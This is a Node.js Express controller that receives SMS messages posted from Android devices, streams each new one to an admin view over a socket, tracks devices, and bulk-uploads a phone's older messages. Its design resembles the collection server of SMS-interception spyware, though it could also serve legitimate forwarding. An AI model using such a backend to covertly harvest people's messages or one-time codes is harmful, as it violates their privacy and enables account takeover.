const SmsLog = require('../models/SmsLog');
const Device = require('../models/Device');

// @desc    Create new SMS log
// @route   POST /api/sms
// @access  Private
const createSmsLog = async (req, res) => {
    try {
        const { device_id, sender, message_body, timestamp, sim_info, device_model, android_version, msg_id } = req.body;

        if (!device_id || !sender || !message_body || !timestamp || !sim_info) {
            console.log("Missing fields:", req.body);
            return res.status(400).json({ message: 'Please provide all fields' });
        }

        // Task 2: Deduplication Check
        const existingSms = await SmsLog.findOne({
            device_id,
            sender,
            message_body,
            timestamp
        });

        if (existingSms) {
            console.log(`Duplicate SMS skipped from ${sender} on device ${device_id}`);
            return res.status(200).json(existingSms); // Idempotent success
        }

        console.log(`Received SMS from ${device_id}: ${sender}`);

        // 1. Create SMS Log
        const smsLog = await SmsLog.create({
            device_id,
            sender,
            message_body,
            timestamp,
            sim_info,
            device_model,
            android_version,
            msg_id
        });

        // Task 3: Real-time Emit (Minimize Latency)
        const io = req.app.get('socketio');
        if (io) {
            io.emit('new_sms', {
                ...smsLog.toObject(),
                device_name: device_model || `Device-${device_id.slice(-4)}`
            });
            console.log(`[SOCKET] Emitted new_sms event for sender: ${sender}`);
        }

        // 2. Update or Register Device
        // We use upsert to create if not exists
        try {
            await Device.findOneAndUpdate(
                { device_id }, // Filter by Unique device_id
                {
                    $set: {
                        model: device_model || 'Unknown Device',
                        android_version: android_version,
                        last_seen: new Date(),
                        socket_id: req.body.socket_id || '' // Optional
                    },
                    $setOnInsert: {
                        is_online: true,
                        name: device_model || `Device-${device_id.slice(-4)}`
                    }
                },
                { upsert: true, new: true, setDefaultsOnInsert: true }
            );
        } catch (deviceError) {
            console.error('Error updating device registry:', deviceError.message);
            // We do NOT return error here, as SMS log is already saved.
            // But we log it for debugging.
        }

        res.status(201).json(smsLog);
    } catch (error) {
        console.error("Error in createSmsLog:", error);
        res.status(500).json({ message: 'Server Error saving SMS' });
    }
};

// @desc    Get all SMS logs
// @route   GET /api/sms
// @access  Private (Admin)
const getSmsLogs = async (req, res) => {
    const logs = await SmsLog.find({}).sort({ timestamp: -1 });
    res.json(logs);
};

// @desc    Clear SMS logs for a specific device
// @route   DELETE /api/sms/:deviceId
// @access  Private (Admin)
const clearSmsLogs = async (req, res) => {
    const { deviceId } = req.params;

    if (!deviceId) return res.status(400).json({ message: 'Device ID required' });

    try {
        await SmsLog.deleteMany({ device_id: deviceId });
        res.json({ message: `Logs cleared for device: ${deviceId}` });
    } catch (error) {
        res.status(500).json({ message: 'Server Error' });
    }
};

// @desc    Bulk sync old SMS messages (chunked, max 50 per request)
// @route   POST /api/sms/sync-old
// @access  Private
const syncOldSms = async (req, res) => {
    try {
        const { device_id, messages } = req.body;

        if (!device_id || !Array.isArray(messages) || messages.length === 0) {
            return res.status(400).json({ message: 'device_id and messages array required' });
        }

        if (messages.length > 50) {
            return res.status(400).json({ message: 'Max 50 messages per chunk' });
        }

        const docs = messages.map(m => ({
            device_id,
            sender: m.sender,
            message_body: m.message_body,
            timestamp: m.timestamp,
            sim_info: m.sim_info || 'SIM_SLOT_0',
            device_model: m.device_model || 'Android Device',
            android_version: m.android_version || '',
        }));

        // ordered:false — continue on duplicate key errors (idempotent re-sync)
        let saved = 0;
        let skipped = 0;
        try {
            const result = await SmsLog.insertMany(docs, { ordered: false });
            saved = result.length;
        } catch (bulkErr) {
            if (bulkErr.code === 11000 || bulkErr.name === 'BulkWriteError') {
                saved = bulkErr.result?.nInserted || 0;
                skipped = docs.length - saved;
            } else {
                throw bulkErr;
            }
        }

        res.status(201).json({ saved, skipped });
    } catch (error) {
        console.error('syncOldSms error:', error);
        res.status(500).json({ message: 'Server Error during bulk sync' });
    }
};

module.exports = { createSmsLog, getSmsLogs, clearSmsLogs, syncOldSms };
